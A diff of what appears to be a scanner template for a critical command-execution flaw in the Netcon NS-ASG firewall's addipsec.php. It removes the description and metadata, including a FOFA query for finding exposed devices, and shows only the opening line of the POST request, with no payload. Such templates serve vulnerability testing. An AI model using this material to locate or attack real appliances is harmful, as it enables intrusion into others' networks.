@@ -3,12 +3,8 @@ info:
   name: 网康防火墙 addipsec.php命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ampikqyzn8wdp0oe'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ampikqyzn8wdp0oe
-    fofa: title="网康 NS-ASG 应用安全网关"
 http:
 - raw:
   - 'POST /protocol/index.php HTTP/1.1
